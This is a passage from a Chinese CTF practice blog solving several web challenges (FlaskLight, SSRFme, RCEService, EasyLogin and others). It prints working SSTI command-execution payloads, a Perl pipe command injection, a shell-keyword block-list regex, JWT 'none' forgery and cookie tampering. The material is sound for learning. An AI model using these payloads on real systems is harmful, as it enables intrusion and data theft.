Qual]FlaskLight</h2><p>一眼ssti，然后就不会了（</p><p>f12看到源码注释，get方式，参数为search</p><p>试一下传<code>&#123;&#123;7*7&#125;&#125;</code>确定是ssti</p><pre class="language-none"><code class="language-none">config 也是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值。&#123;&#123; config.items() &#125;&#125;    &#x2F;&#x2F; 查看配置项目的信息  </code></pre><p><code>&#123;&#123;(()|select|string)[24]~(()|select|string)[24]~(()|select|string)[15]~(()|select|string)[20]~(()|select|string)[6]~(()|select|string)[18]~(()|select|string)[18]~(()|select|string)[24]~(()|select|string)[24]&#125;&#125; </code></p><p>例一：<br>warnings.catch_warnings类</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre><p>PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’]</p><p>最后获取flag</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </code></pre><p>例二：</p><pre class="language-none"><code class="language-none">class’site._Printer’类&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</code></pre><p>获取flag</p><pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</code></pre><p>例三：<br>popen</p><pre class="language-none"><code class="language-none">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125;</code></pre><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>进去后是php代码</p><p>直接抄的其他师傅的注释</p><pre class="language-none"><code class="language-none">&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);  &#x2F;&#x2F; explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];    &#125;    echo $_SERVER[&quot;REMOTE_ADDR&quot;];    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);   &#x2F;&#x2F; “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。     @mkdir($sandbox);    @chdir($sandbox);     &#x2F;&#x2F; 改变当前的目录到$sandbox    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     &#x2F;&#x2F; escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);  &#x2F;&#x2F; pathinfo() 函数以数组的形式返回文件路径的信息。    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));   &#x2F;&#x2F; basename() 函数返回路径中的文件名部分。    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__);    &#x2F;&#x2F; 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。</code></pre><p>简单来说就是利用传参中的url执行命令，然后将结果保存在filename中</p><p>有几个地方不太懂</p><p>​    1.百度的wp都说这里利用的perl脚本里的open漏洞</p><pre class="language-none"><code class="language-none">利用GET中的open函数漏洞。open函数在GET命令被调用时执行，也就是第五行执行GET命令时，perl语言会调用open命令，漏洞就存在于open命令对于文件的处理上，关于这个漏洞，外国人有文章，是这样写的：Perl saw that your “file” ended with a “pipe” (verticalbar) character. So it interpreted the “file” as a command to be executed, and interpreted the command’s output as the “file”&#39;s contents. The command is “who” (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you.翻译过来意思是perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。</code></pre><p>​    2.这里执行url传入的命令的前提是要求有个以该命令命名的文件</p><p>?url=/&amp;filename=1.txt 看一下根目录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103205139421.png" alt="image-20211103205139421"></p><p>有两个和flag有关的文件，试flag无果，只能试试readflag</p><p>?url=&amp;filename=bash -c /readflag|</p><p>先创建一个bash -c /readflag|的文件</p><p>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</p><p>利用url执行命令</p><p>/sandbox/md5值/bash -c /readflag|</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103205748482.png" alt="image-20211103205748482"></p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002530209.png" alt="image-20211115002530209"></p><p>json格式</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002559767.png" alt="image-20211115002559767"></p><p>cmd</p><p>可以猜到执行命令格式是</p><p>{&quot;cmd&quot;:&quot;ls&quot;}</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002808993.png" alt="image-20211115002808993"></p><p>还可以直接get参数进去</p><p>但是cat参数没法直接用，还有过滤，不过可以用换行符绕过过滤</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpputenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);设置了环境变量的PATH，导致不能使用相对路径，只能用绝对路径：if (isset($_REQUEST[&#39;cmd&#39;])) &#123;    $json &#x3D; $_REQUEST[&#39;cmd&#39;];if (!is_string($json)) &#123;    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;&#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\&#x2F;;-@\[-&#96;|~\x7F]+).*$&#x2F;&#39;, $json)) &#123;    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;&#125; else &#123;    echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;;    $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;];    if ($cmd !&#x3D;&#x3D; NULL) &#123;        system($cmd);    &#125; else &#123;        echo &#39;Invalid input&#39;;    &#125;    echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;&#125;&#125;?&gt;</code></pre><p>cat命令不能直接用，原因可能是当前的PATH下没有cat，这里需要也需要用绝对路径：</p><blockquote><p><a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Linux">Linux</a>命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p></blockquote><p>cat 读出源码（我也很想知道网上的wp没源码之前怎么想到这么绕过的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115003758590.png" alt="image-20211115003758590"></p><p>然后找flag在的目录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115003933107.png" alt="image-20211115003933107"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115004010321.png" alt="image-20211115004010321"></p><p>找到之后利用cat读出来</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115004044237.png" alt="image-20211115004044237"></p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>注册个账号，登录，看到有个getflag但是提示权限不够</p><p>查看源码发现全是js的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122204752692.png" alt="image-20211122204752692"></p><p>看一下app.js</p><pre class="language-none"><code class="language-none">&#x2F;** *  或许该用 koa-static 来处理静态文件 *  路径该怎么配置？不管了先填个根目录XD *&#x2F;function login() &#123;    const username &#x3D; $(&quot;#username&quot;).val();    const password &#x3D; $(&quot;#password&quot;).val();    const token &#x3D; sessionStorage.getItem(&quot;token&quot;);    $.post(&quot;&#x2F;api&#x2F;login&quot;, &#123;username, password, authorization:token&#125;)        .done(function(data) &#123;            const &#123;status&#125; &#x3D; data;            if(status) &#123;                document.location &#x3D; &quot;&#x2F;home&quot;;            &#125;        &#125;)        .fail(function(xhr, textStatus, errorThrown) &#123;            alert(xhr.responseJSON.message);        &#125;);&#125;function register() &#123;    const username &#x3D; $(&quot;#username&quot;).val();    const password &#x3D; $(&quot;#password&quot;).val();    $.post(&quot;&#x2F;api&#x2F;register&quot;, &#123;username, password&#125;)        .done(function(data) &#123;            const &#123; token &#125; &#x3D; data;            sessionStorage.setItem(&#39;token&#39;, token);            document.location &#x3D; &quot;&#x2F;login&quot;;        &#125;)        .fail(function(xhr, textStatus, errorThrown) &#123;            alert(xhr.responseJSON.message);        &#125;);&#125;function logout() &#123;    $.get(&#39;&#x2F;api&#x2F;logout&#39;).done(function(data) &#123;        const &#123;status&#125; &#x3D; data;        if(status) &#123;            document.location &#x3D; &#39;&#x2F;login&#39;;        &#125;    &#125;);&#125;function getflag() &#123;    $.get(&#39;&#x2F;api&#x2F;flag&#39;).done(function(data) &#123;        const &#123;flag&#125; &#x3D; data;        $(&quot;#username&quot;).val(flag);    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;        alert(xhr.responseJSON.message);    &#125;);&#125;</code></pre><p>提示是基于Node.js的koa框架，但是这个页面的代码并不是逻辑代码，用处不大。<br>在注释里提示静态文件处理出现问题，那么可能会出现任意文件读取漏洞</p><p>这里需要对koa框架的目录有一定的了解</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122205026873.png" alt="image-20211122205026873"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873007950084a1a7b518c2216100ff330f7ed7a6.png" alt="img"></p><p>访问一下controllers路径下的api.js</p><p>额，这里赵总说是经验。。。</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token keyword">const</span> APIError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../rest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>APIError<span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'POST /api/register'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'register error'</span><span class="token punctuation">,</span> <span class="token string">'wrong username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>algorithm<span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            token<span class="token operator">:</span> token        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">'POST /api/login'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'username or password is necessary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> ctx<span class="token punctuation">.</span>header<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>authorization<span class="token punctuation">;</span>        <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sid <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'no such secret id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>algorithm<span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> status <span class="token operator">=</span> username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            status        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">'GET /api/flag'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'permission error'</span><span class="token punctuation">,</span> <span class="token string">'permission denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            flag        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">'GET /api/logout'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            status<span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>赵总wp里的审计:</p><p>注册 /api/register，接受传入的 username 和 password，先判断 username 不为 admin，然后生成一个 key 来以这些信息为依据，生成一个 jwt 令牌，key 同时存入全局数组。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873008936cf41d35abc0ecab06b6f56706bee1b5-1024x542.png" alt="img"></p><p>登录 /api/login，接受传入的 username 和 password，然后从令牌的信息段中取 key 的 id，从程序中的全局数组取出 key，然后进行验证，验证通过之后置 session 中的 username 为登录时使用的 username。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1587301099a4070df83cd56999e7efbafb05e2e004-1024x757.png" alt="img"></p><p>获取FLAG /api/flag，判断 session 中的用户名是否为 admin，是的话就直接给 flag。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1587301284fe28eb6eb5a5362ed0749a45de8eb406-1024x468.png" alt="img"></p><p>可以看到信息是用 jwt 令牌储存的，使用 jsonwebtoken 库来操作，这里用的是 HS256加密，但经过测试发现，当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过，这样很轻松地就可以伪造一个 username 为 admin 的 jwttoken 了。</p><p>在登录界面抓包后边这串就是jwt（当时忘了截图，这是改完jwt之后的了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210021834.png" alt="image-20211122210021834"></p><p>之后在<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>里解码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210147429.png" alt="image-20211122210147429"></p><p>接下来也是赵总的分析：</p><p>回到源程序逻辑中，若想让这里的密钥 key为空，就需要修改上面的 secretid。那么就尝试修改 secretid，使其无法作为全局变量 secrets 数组的索引，那么 secret 就会为空了。</p><p><a href="https://www.zhaoj.in/wp-content/uploads/2020/04/15873021389c8e46ed2ff4ebdc4215e90585dbcd31.png"><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873021389c8e46ed2ff4ebdc4215e90585dbcd31-1024x245.png" alt="img"></a></p><p>注意，这里还有一个验证，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。乍看之下没有操作空间，怎么整都会取出 密钥 key。但别忘了 JavaScript 是一门弱类型语言，NodeJS 都是 JS 的语法，那自然也是咯。所以我们只要选择恰当的数据来绕过这个判断即可。可以做一个小实验来验证我们的想法。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/158730244598990809373d961e187fa7d0a66cc4ce-1024x459.png" alt="img">一个小实验，空数组与数字比较永远为真，当然用空字符串之类的也可以</p><p>最后利用python的PyJWT库来加密</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210434868.png" alt="image-20211122210434868"></p><p>抓包再放包就可以读取这个flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210523101.png" alt="image-20211122210523101"></p><p><a href="https://www.zhaoj.in/read-6512.html">虎符 CTF Web 部分 Writeup – glzjin (zhaoj.in)</a></p><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>抓包之后一直往下走</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211557104.png" alt="image-20211123211557104"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211609605.png" alt="image-20211123211609605"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211625629.png" alt="image-20211123211625629"></p><p>源码里找不到就去看js</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211646833.png" alt="image-20211123211646833"></p><p>最后可以找到一个</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211708969.png" alt="image-20211123211708969"></p><p>随机排列组合得到flag</p><pre class="language-none"><code class="language-none">from itertools import permutationsflag &#x3D; [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item &#x3D; permutations(flag)#对flag全排列，返回的是iterators（迭代器）for i in item:k &#x3D; &#39;&#39;.join(i)#join连接成为字符串if k[-1] &#x3D;&#x3D;&#39;&#125;&#39; and k[0:13] &#x3D;&#x3D; &#39;pctf&#123;hey_boys&#39;:&#x2F;&#x2F;这里还可以用python的startswich方法判断是否是pctf&#123;hey开头&#x2F;&#x2F;if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1] &#x3D;&#x3D;&#39;&#125;&#39;:print(k)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211727781.png" alt="image-20211123211727781"></p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>抓session，base64解码把金额改成100，放包</p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124200900405.png" 